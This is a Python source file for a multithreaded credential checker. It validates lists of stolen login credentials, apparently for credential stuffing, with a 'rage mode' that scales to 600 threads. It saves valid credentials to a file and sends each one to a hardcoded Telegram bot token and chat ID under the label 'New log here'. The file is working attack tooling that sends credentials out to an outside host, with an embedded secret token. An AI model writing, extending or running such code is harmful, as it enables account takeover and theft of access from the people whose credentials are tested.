import threading
from queue import Queue
from typing import List
from credential_checker import Credential, CredentialChecker
from logger import Logger
from config import Config
from tqdm import tqdm
from threading import Lock
import time
import telegram
import sys
import os

class CredentialWorker:
    def __init__(self, config: Config):
        self.config = config
        self.num_threads = config.num_threads
        self.cred_queue: Queue = Queue()
        self.valid_queue: Queue = Queue()
        self.logger = Logger(config.log_file, config.log_level)
        self.checker = CredentialChecker(
            max_retries=config.max_retries,
            logger=self.logger
        )
        self.threads: List[threading.Thread] = []
        self.progress_bar = None
        self.progress_lock = Lock()
        self.processed_count = 0
        self.stop_flag = threading.Event()
        self.processed_file = 'processed.txt'
        self.processed_credentials = self.load_processed_credentials()

        # Initialize Telegram bot
        self.bot = telegram.Bot(token='6549576274:AAFMGbRLtL1l7aUZWglnpLWQLKuCDCO0Z5g')
        self.chat_id = '5217459733'

    def update_progress(self):
        """Update the progress bar in a thread-safe way"""
        with self.progress_lock:
            self.processed_count += 1
            if self.progress_bar:
                self.progress_bar.update(1)

    def send_telegram_message(self, message: str):
        """Send a message to the Telegram bot"""
        try:
            self.bot.send_message(chat_id=self.chat_id, text=message)
        except Exception as e:
            self.logger.error(f"Failed to send message: {str(e)}")

    def load_processed_credentials(self):
        """Load processed credentials from a file"""
        if os.path.exists(self.processed_file):
            with open(self.processed_file, 'r') as file:
                return set(line.strip() for line in file)
        return set()

    def save_processed_credential(self, credential: Credential):
        """Save a processed credential to the file"""
        with open(self.processed_file, 'a') as file:
            file.write(credential.to_line() + '\n')

    def worker(self):
        """Worker thread function that processes credentials from the queue"""
        while not self.stop_flag.is_set():
            try:
                credential = self.cred_queue.get(timeout=1)
                if credential.to_line() in self.processed_credentials:
                    self.cred_queue.task_done()
                    continue

                if self.checker.check_credential(credential):
                    self.valid_queue.put(credential)
                    self.logger.info(f"Valid credential found: {credential.to_line()}")
                    self.send_telegram_message(f"New log here: {credential.to_line()}")
                    self.save_valid_credential(credential)

                self.save_processed_credential(credential)
                self.update_progress()
                self.cred_queue.task_done()
            except Queue.Empty:
                break
            except Exception as e:
                self.logger.error(f"Error processing credential: {str(e)}")
                self.update_progress()
                self.cred_queue.task_done()

    def save_valid_credential(self, credential: Credential):
        """Save a valid credential to the output file"""
        with open(self.config.output_file, 'a') as valid_file:
            valid_file.write(credential.to_line() + '\n')

    def process_credentials(self, credentials: List[Credential]):
        total_credentials = len(credentials)
        self.progress_bar = tqdm(
            total=total_credentials,
            desc="Checking credentials",
            unit="cred"
        )

        for credential in credentials:
            if credential.to_line() not in self.processed_credentials:
                self.cred_queue.put(credential)

        if self.config.rage:
            self.num_threads = 100

        # Start a thread to listen for the "q" key
        threading.Thread(target=self.listen_for_quit, daemon=True).start()

        while not self.cred_queue.empty() and not self.stop_flag.is_set():
            if self.config.rage and self.num_threads < 600:
                self.num_threads += 50
                self.logger.info(f"Rage mode: Increasing threads to {self.num_threads}")

            for _ in range(self.num_threads - len(self.threads)):
                thread = threading.Thread(target=self.worker)
                thread.daemon = True
                thread.start()
                self.threads.append(thread)

            time.sleep(1)  # Adjust interval as needed

        self.cred_queue.join()
        self.progress_bar.close()

        valid_credentials = []
        while not self.valid_queue.empty():
            valid_credentials.append(self.valid_queue.get())

        return valid_credentials

    def listen_for_quit(self):
        """Listen for the 'q' key to stop the program"""
        print("Press 'q' to stop the program.")
        while not self.stop_flag.is_set():
            if input().strip().lower() == 'q':
                self.logger.info("Stopping program...")
                self.stop_flag.set()
                break 